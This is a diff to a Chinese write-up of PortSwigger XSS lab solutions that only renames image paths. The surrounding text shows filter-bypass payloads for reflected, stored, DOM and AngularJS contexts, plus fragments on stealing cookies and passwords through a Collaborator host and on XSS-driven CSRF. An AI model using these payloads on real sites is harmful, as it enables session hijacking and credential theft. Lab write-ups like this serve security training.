@@ -142,7 +142,7 @@ payload
 
 这个题漏洞出在提交评论的地方。提交了几次之后发现位置。
 
-![7](XSS-hard.assets/7.png)
+![7](xss-burp.assets/7.png)
 
 发现没有过滤。。。就直接输入就可以了。
 
@@ -150,7 +150,7 @@ payload
 
 按键触发。canonical link tag。
 
-![8](XSS-hard.assets/8.png)
+![8](xss-burp.assets/8.png)
 
 发现位置。
 
@@ -165,7 +165,7 @@ url/?%27accesskey=%27x%27onclick=%27alert(1)%27
 
 #### 9.Reflected XSS into a JavaScript string with single quote and backslash escaped
 
-![9](XSS-hard.assets/9.png)
+![9](xss-burp.assets/9.png)
 
 找到位置。
 
@@ -181,11 +181,11 @@ payload：
 
 `< >`都被过滤了。
 
-![10.1](XSS-hard.assets/10.1.png)
+![10.1](xss-burp.assets/10.1.png)
 
 在这里可以看到输入的特殊字符都被转义了。
 
-![10.2](XSS-hard.assets/10.2.png)
+![10.2](xss-burp.assets/10.2.png)
 
 这里源码可以清晰的看到输入是被一次url转码了。
 
@@ -199,11 +199,11 @@ payload：
 
 尖括号和双引号被编码，单引号被过滤。
 
-![11.1](XSS-hard.assets/11.1.png)
+![11.1](xss-burp.assets/11.1.png)
 
 注入点还是刚刚这个地方，只不过单双引号都无了。
 
-![11.2](XSS-hard.assets/11.2.png)
+![11.2](xss-burp.assets/11.2.png)
 
 可以看到，这里的单引号是用的反斜杠来转义的，而且他没有对反斜杠进行过滤操作，那么我们可以自己加反斜杠来绕过。
 
@@ -215,7 +215,7 @@ payload：`\';alert(1);//`
 
 这个题目输入在url中。还被禁止了一些字符。随便点一个post，找到可以注入的url。
 
-![12.1](XSS-hard.assets/12.1.png)
+![12.1](xss-burp.assets/12.1.png)
 
 这个题经过测试，发现括号被过滤了。
 
@@ -243,7 +243,7 @@ payload：`\';alert(1);//`
 
 `https://your-lab-id.web-security-academy.net/post?postId=5&'},y=x=>{throw/**/onerror=alert,1337},toString=y,window+'',{a:'`
 
-![12.2](XSS-hard.assets/12.2.png)
+![12.2](xss-burp.assets/12.2.png)
 
 个人解释：
 
@@ -259,11 +259,11 @@ payload：`\';alert(1);//`
 
 #### 13. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
-![13.1](XSS-hard.assets/13.1.png)
+![13.1](xss-burp.assets/13.1.png)
 
 提交评论，然后点击作者名称将会调用alert。
 
-![13.2](XSS-hard.assets/13.2.png)
+![13.2](xss-burp.assets/13.2.png)
 
 这个题目大概就是你在提交的时候，你填写的website部分会变成你名字的链接，并且还在onclick里面有展示。
 
@@ -271,11 +271,11 @@ payload：`\';alert(1);//`
 
 直接尝试闭合，发现单引号被转义了，尝试自己加反斜杠。
 
-![13.3](XSS-hard.assets/13.3.png)
+![13.3](xss-burp.assets/13.3.png)
 
 然后发现，反斜杠也被处理掉了。
 
-![13.4](XSS-hard.assets/13.4.png)
+![13.4](xss-burp.assets/13.4.png)
 
 尝试一下单引号的实体编码。好像实体编码可以在js里面被解析。
 
@@ -292,13 +292,13 @@ payload：`\';alert(1);//`
 
 #### 14. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
-![14.1](XSS-hard.assets/14.1.png)
+![14.1](xss-burp.assets/14.1.png)
 
 要在这里面绕过，并且触发alert。
 
 在尝试的过程中，发现单引号变成了`\u0027`，被unicode编码了，尝试用实体编码来绕过。
 
-![14.2](XSS-hard.assets/14.2.png)
+![14.2](xss-burp.assets/14.2.png)
 
 这次应该是直接写进去的，所以并没有被转换。实体编码也不行。
 
@@ -318,7 +318,7 @@ payload：`${alert(1)}`
 
 #### 15. Reflected XSS with AngularJS sandbox escape without strings
 
-![15.1](XSS-hard.assets/15.1.png)
+![15.1](xss-burp.assets/15.1.png)
 
 这个题目使用了[AngularJS沙箱](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox)。
 
@@ -408,7 +408,7 @@ payload:`<script>alert(1)</script>`
 
 输入safe之后，发现：
 
-![18](XSS-hard.assets/18.png)
+![18](xss-burp.assets/18.png)
 
 应该只需要闭合然后随便弄一下就好了。
 
@@ -420,7 +420,7 @@ payload:`safe" onload="alert(1)`
 
 注入点应该在`storeId`这里。
 
-![19.1](XSS-hard.assets/19.png)
+![19.1](xss-burp.assets/19.png)
 
 仔细观察源代码，发现漏洞。构造payload。
 
@@ -428,7 +428,7 @@ payload:`safe" onload="alert(1)`
 
 #### 20. DOM XSS in `innerHTML` sink using source `location.search`
 
-![20.1](XSS-hard.assets/20.1.png)
+![20.1](xss-burp.assets/20.1.png)
 
 虽然`<script>alert(1)</script>`已经输入进去了，但是没有弹窗，应该是没有触发。
 
@@ -438,7 +438,7 @@ payload:`safe" onload="alert(1)`
 
 #### 21. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
-![21](XSS-hard.assets/21.png)
+![21](xss-burp.assets/21.png)
 
 这里是用JQuery定位了`backLink`，而这里的`href`是可控的，在url可以输入。
 
@@ -456,7 +456,7 @@ payload:`/feedback?returnPath=javascript:alert(document.cookie)`
 
 用双花括号可以执行js命令。
 
-![22](XSS-hard.assets/22.png)
+![22](xss-burp.assets/22.png)
 
 这里使用了ng标签。我们用双花括号去执行js命令。
 
@@ -468,11 +468,11 @@ payload:`/feedback?returnPath=javascript:alert(document.cookie)`
 
 #### 23. Reflected DOM XSS
 
-![23.1](XSS-hard.assets/23.1.png)
+![23.1](xss-burp.assets/23.1.png)
 
 这里可以看到是直接eval的。
 
-![23.2](XSS-hard.assets/23.2.png)
+![23.2](xss-burp.assets/23.2.png)
 
 这里用burp拦截了一下，发现这里返回了一个json。结合上面的eval函数，可以直接构造。
 
@@ -533,7 +533,7 @@ payload：`<><img src="ss.ss" onerror=alert(1)>`
 
 其中url就是`urpcollaborator.net`的地址。
 
-![25.1](XSS-hard.assets/25.1.png)
+![25.1](xss-burp.assets/25.1.png)
 
 这个时候已经可以收到发送来的东西了，但是不给过。
 
@@ -549,7 +549,7 @@ payload：`<><img src="ss.ss" onerror=alert(1)>`
 
 因为你写了这个之后，他会给你发一个cookie，然后你要用这个cookie进去。
 
-![25.2](XSS-hard.assets/25.2.png)
+![25.2](xss-burp.assets/25.2.png)
 
 
 
@@ -580,13 +580,13 @@ body:username.value+':'+this.value
 
 #### 27. Exploiting XSS to perform CSRF
 
-![27.1](XSS-hard.assets/27.1.png)
+![27.1](xss-burp.assets/27.1.png)
 
 这个题目在comment这里存在一个XSS漏洞，然后直接构建CSRF攻击。
 
 这道题在更改email的地方存有token，需要取出来。
 
-![27.2](XSS-hard.assets/27.2.png)
+![27.2](xss-burp.assets/27.2.png)
 
 下面是js代码。
 
@@ -624,9 +624,9 @@ match函数的作用主要是获取当前的token，然后如果有分组，则�
 
     这里不能用img标签然后通过src传递，传不出去。
 
-    ![28.1](XSS-hard.assets/28.1.png)
+    ![28.1](xss-burp.assets/28.1.png)
 
-    ![28.2](XSS-hard.assets/28.2.png)
+    ![28.2](xss-burp.assets/28.2.png)
 
     这里将特殊符号url编码。
 
@@ -689,9 +689,9 @@ if(window.name) {
 
 这里在搜索框进行注入，发现注入成功，但是执行被禁止了。
 
-![30.1](XSS-hard.assets/30.1.png)
+![30.1](xss-burp.assets/30.1.png)
 
-![30.2](XSS-hard.assets/30.2.png)
+![30.2](xss-burp.assets/30.2.png)
 
 在burp拦截的history中可以看到：
 
